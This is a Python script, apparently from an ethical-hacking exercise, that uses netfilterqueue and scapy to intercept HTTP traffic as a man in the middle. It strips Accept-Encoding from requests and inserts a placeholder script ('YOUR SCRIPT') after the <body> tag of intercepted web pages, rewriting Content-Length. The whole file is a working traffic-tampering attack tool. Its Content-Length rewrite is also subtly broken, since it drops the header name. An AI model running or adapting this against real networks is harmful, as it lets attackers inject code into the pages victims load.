#!/usr/bin/env python
import time

import netfilterqueue
import scapy.all as scapy
import optparse
import re


def mod_packet(packet, load):
    packet.load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        if scapy_packet.dport == 80:
            # print("[+] REQUEST >>>")
            # print("\n----EXAMPLE------\n")
            # print(scapy_packet.load.decode())
            # print("\n----CHANGED-----\n")
            load_temp = scapy_packet.load.decode()
            new_load = (re.sub("Accept-Encoding:.*?\\r\\n", "", load_temp)).encode()
            # print(new_load)
            # print("\n---PACKET----\n")
            scapy_packet.load = new_load.decode()
            # scapy_packet.show()
            # print("\n--------------\n")
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(bytes(scapy_packet))
        if scapy_packet.sport == 80 and "<body" in str(scapy_packet.load) and "301 Moved" not in str(scapy_packet[scapy.Raw].load):
            load_temp = scapy_packet.load.decode()
            inj_code = 'YOUR SCRIPT'
            new = (load_temp.replace("<body>", "<body>" + inj_code)).encode()
            content_length = re.search("(?:Content-Length:\s)(\d*)", str(load_temp))
            if content_length:
                length = content_length.group(1)
                print(length)
                new_length = int(length) + len(inj_code)
                new = (re.sub("(?:Content-Length:\s)(\d*)", str(new_length), new.decode())).encode()
            if scapy_packet.load != new:
                print("\n----EXAMPLE------\n")
                print(scapy_packet.load)
                print("\n----CHANGED-----\n")
                print(new)
                print("\n--------------\n")
            scapy_packet.load = new.decode()
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queuee = netfilterqueue.NetfilterQueue()
queuee.bind(0, process_packet)
queuee.run()
